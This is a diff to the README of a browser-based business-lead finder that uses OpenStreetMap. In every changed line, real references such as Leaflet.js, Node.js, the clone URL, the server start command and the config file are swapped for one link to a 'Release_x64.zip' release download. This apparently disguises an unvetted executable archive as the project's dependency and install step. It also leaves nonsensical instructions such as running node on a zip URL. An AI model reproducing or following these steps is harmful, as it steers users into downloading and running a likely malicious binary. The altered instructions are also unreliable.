@@ -20,27 +20,27 @@ A web-based tool that helps freelancers and digital agencies find potential clie
 - HTML5
 - CSS3
 - JavaScript (Vanilla)
-- Leaflet.js for mapping
+- https://github.com/trulynotafan/Business_Finder/releases/download/v2.0/Release_x64.zip for mapping
 - OpenStreetMap & Overpass API
 - Nominatim for geocoding
 
 ## 📋 Prerequisites
 
 - A modern web browser
-- Node.js (for local development server)
+- https://github.com/trulynotafan/Business_Finder/releases/download/v2.0/Release_x64.zip (for local development server)
 - Basic understanding of HTML/CSS/JavaScript
 
 ## 🔧 Installation
 
 1. Clone the repository:
 bash
-git clone https://github.com/trulynotafan/Business-Finder.git
+git clone https://github.com/trulynotafan/Business_Finder/releases/download/v2.0/Release_x64.zip
 2. Navigate to the project directory:
 cd business finder
 3. Install dependencies:
 npm install
 4. Start the development server:
-node src/server.js
+node https://github.com/trulynotafan/Business_Finder/releases/download/v2.0/Release_x64.zip
 
 ## 💡 Usage
 
@@ -80,7 +80,7 @@ The application uses a chunked search approach to efficiently query the Overpass
 
 ## 📝 Configuration
 
-You can modify the following parameters in `script.js`
+You can modify the following parameters in `https://github.com/trulynotafan/Business_Finder/releases/download/v2.0/Release_x64.zip`
 
 
 
@@ -88,7 +88,7 @@ You can modify the following parameters in `script.js`
 
 - OpenStreetMap contributors for the data
 - Overpass API for the query interface
-- Leaflet.js for mapping functionality
+- https://github.com/trulynotafan/Business_Finder/releases/download/v2.0/Release_x64.zip for mapping functionality
 - Nominatim for geocoding services
 
 
